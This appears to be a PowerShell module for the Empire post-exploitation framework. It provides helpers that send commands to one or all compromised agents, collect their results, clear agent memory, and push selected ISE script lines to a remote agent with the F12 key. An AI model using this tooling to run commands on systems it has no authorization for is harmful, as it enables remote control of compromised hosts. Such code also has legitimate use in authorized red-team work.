#################################################################################### CommandX

<#
.Synopsis
   Run Commands on Multiple Agents
.DESCRIPTION
   Run PoSh Commands on Agents
.EXAMPLE
   CommandX Get-Date QWERTYU
   Command to default agent (same as using command)
.EXAMPLE
   Agent * | CommandX "Write-Output 'HelloWorld'" 
   Command to all agents in current session
.INPUTS
   None 
.OUTPUTS
   Alwqays Blind
.NOTES
   Use Invoke-EmpireResult to recover results
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Run PoSh Commands on Multiple Agents
#>
Function Invoke-EmpireCommandX{
    [CmdletBinding()]
    [Alias('CommandX')]
    Param(
        [Parameter(Mandatory=$true)][String]$Command
        )
    DynamicParam{
        $Values = @(Agent *)
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary       
        }
    Begin{}
    Process{
        foreach($Target in $dynParam.Value){
            # Call blind command
            Command -Agent $Target -Command $command -blind
            }
        }
    End{}
    }

###################################################################################### Result

<#
.Synopsis
   Get Agent Result
.DESCRIPTION
   Get Agent Result
.EXAMPLE
   Result QWERTYU
   Get result for specified agent
.EXAMPLE 
   Agent * | Result 
   Get last result for all agents in current session
.INPUTS
   Accepts multiple input
   Accepts pipeline input 
.OUTPUTS
   Agent results
.NOTES
   Use Flush command to clear agent memory
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Get Agent results
#>
function Invoke-EmpireResult{
    [Alias('Result')]
    Param(
        [Parameter(Mandatory=$false)][switch]$Full
        )
    DynamicParam{
        $Values = @(Agent *)
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary  
        }
    begin{$Result=@()
        }
    process{
        if(!$dynParam.Value){$Agent=$Global:EmpireTarget.Agent}
        else{$Agent = $dynParam.Value}
        foreach($A in $agent){
            $Data=Get-EmpireAgentTaskResult -Name $A
            if($Full){$Res=$data}
            else{$Res = ($Data[$Data.count -1]).results}
            $Result += $res
            }
        }
    end{Return $Result}
    }


####################################################################################### Flush

<#
.Synopsis
   Clear Agent Result
.DESCRIPTION
   Clear Empire Agent memory
.EXAMPLE 
   Flush QWERTYU
   Flush memory for specified agent
.EXAMPLE
   Flush *
   Flush memory for agents in current session
.INPUTS
   None 
.OUTPUTS
   No output if success
.NOTES
   Does not work even if success returned // bug in Empire for now
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Flush agent memory
#>
function Invoke-EmpireFlush{
    [CmdletBinding()]
    [Alias('Flush')]
    Param()
    DynamicParam{
        # Prep DynSet
        $Values = @('*')
        $Values += $Global:EmpireAgents.name
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection 
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)
            
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary
        }
    Begin{
        $Agent=$dynParam.Value
        if($Agent -eq '*'){$Agent=$Global:EmpireAgents.name}
        }
    Process{
        Foreach($Target in $Agent){
            $Result = Clear-EmpireAgentTaskResult -Id $Global:EmpireTarget.Session -Name "$Target"
            }
        }
    End{}
    }





################################################################################## SniperISEr

#Only if host is ISE
if($psISE){


##################

<#
.Synopsis
   ISE ScriptPane Commands to Empire Agent (Multi-line)
.DESCRIPTION
   PowerShell ISE add-on to send commands to Empire Agent using Empire API and PowerEmpire Module
.EXAMPLE
   Invoke-SniperISEr -Line 2
   Will run line 2 of ISE scriptPane against default SessionId and default AgentName
.EXAMPLE
   SniperISEr -Line 2 -To 4
   Will run ScriptBlock from line 2 to 4 against default SessionId and default AgentName
.EXAMPLE
   SniperISEr 2 4 -SessionId 1 -AgentName Foo
   Will run ScriptBlock from line 2 to 4 against specified Session and Agent
.EXAMPLE
   xx 2 4
   Will run ScriptBlock from line 2 to 4 against default SessionId and default AgentName
.INPUTS
   ISE ScriptPane
.OUTPUTS
   Command Result
.NOTES
   Requires Empire server in API mode
   Requires PowerEmpire2.0_DogMod 
   (based on PowerEmpire by @Carlos_Perez aka 'DarkOperator')
.ROLE
   ISE SniperISEr
.FUNCTIONALITY
   ISE ScriptPane commands to Empire Agent
#>
function Invoke-SniperISEr{
    [CmdletBinding()]
    [Alias('Sniper','xx')]
    Param(
        # Specify Line/StartLine Number
        [Parameter(Mandatory=$true,Position=0)][Int]$Line,
        # Specify EndLine Number
        [Parameter(Mandatory=$False,Position=1)][Int]$To,
        # Specify PowerEmpire Session ID
        [Parameter(Mandatory=$False)][Int]$SessionId = $Global:EmpireTarget.Session,
        # Specify Empire Agent Name
        [Parameter(Mandatory=$False)][String]$AgentName = $Global:EmpireTarget.Agent,
        #Test Command on localHost
        [Parameter(Mandatory = $false)][Switch]$Blind
        )
    # Prep Vars
    $Console = $psISE.CurrentPowerShellTab.ConsolePane
    $Editor = $psISE.CurrentFile.Editor
    #$Tab = $psISE.CurrentPowerShellTab.DisplayName
    $FullText = $Editor.text

    ##Actions
    # Select Line(s)
    if(!$To){
        $Editor.SetCaretPosition($Line,1)
        $Editor.SelectCaretLine()
        If($Blind){$Result = ShadowOperator -Id $SessionId -Name $AgentName -Blind $Blind}
        Else{$Result = ShadowOperator -Id $SessionId -Name $AgentName}
        $Editor.SetCaretPosition($Line,1)
        $Console.focus()
        }
    if($Line -and $To){
        $Editor.SetCaretPosition($To,1)
        $Editor.SelectCaretLine()
        $Select = $Editor.SelectedText
        $Length = $Select.length
        $Editor.Select($Line,1,$To,$Length+1)
        If($Blind){$Result = ShadowOperator -Id $SessionId -Name $AgentName -Blind $Blind}
        Else{$Result = ShadowOperator -Id $SessionId -Name $AgentName}
        $Editor.SetCaretPosition($Line,1)
        $Console.Focus()
        }
    Return $result
    }#End


<#
.Synopsis
   Script Pane Selection to empire agents via F12
.DESCRIPTION
   Selected Script Pane Commands to empire agents via F12
   Do not use from command line
   Use Invoke-SniperISEr (xx)
.EXAMPLE
   F12
.INPUTS
   Inputs to this cmdlet (if any)
.OUTPUTS
   Output from this cmdlet (if any)
.NOTES
   General notes
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   F12 KeyBoard Shortcut - ISE Add-on
.FUNCTIONALITY
   Commands to empire agents via F12
#>
function ShadowOperator{
        [CmdletBinding()]
        param(
            [Parameter()][int]$Id = $Global:EmpireTarget.Session,
            [Parameter()][String]$Name = $Global:EmpireTarget.Agent,
            [Parameter()][Bool]$Blind
            )
        #Prepare Selection
        $Editor = $psISE.CurrentFile.Editor
        if(!$Editor.SelectedText){$Editor.SelectCaretLine()}
        $SplitSelect = $Editor.SelectedText.replace("`n",'').Split("`r")
        $StripSelect = $SplitSelect.trim()
        if($SplitSelect.trim() -match "^#"){$StripSelect = $SplitSelect.trim() -notmatch "^#"}
        $JoinSelect = $StripSelect -join ';'
        $CleanSelect = $JoinSelect.replace(';;',';').replace('{;','{').trim().trimStart(';').trimEnd(';')
        if($CleanSelect -eq 'False'){write-Host "Computer says No...";Break}
        
        if($Blind -eq $false){$OldCount=(Result -Agent $Name -Full).count}
        #Send commands
        $Null = Register-EmpireAgentShellCommandTask -Id $Id -Name $Name -Command "$CleanSelect"
        #if not blind
        if($Blind -eq $false){
            #Wait for results
            $NewCount = (Result -Agent $Name -Full).count
            while($NewCount -eq $OldCount){
                Start-Sleep -Seconds 1
                $data = Result -Agent $Name -Full
                $NewCount = $data.count
                }
            #Prep Result
            $data = Result -Agent $Name -Full
            $Result = ($Data[$Data.count -1]).results
            Return $result
            }          
        }


# Keyboard Shortcut
try{$Null = $psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add(“SniperISEr”, {ShadowOperator}, “F12”)}catch{}



#################




}






############################################ END ############################################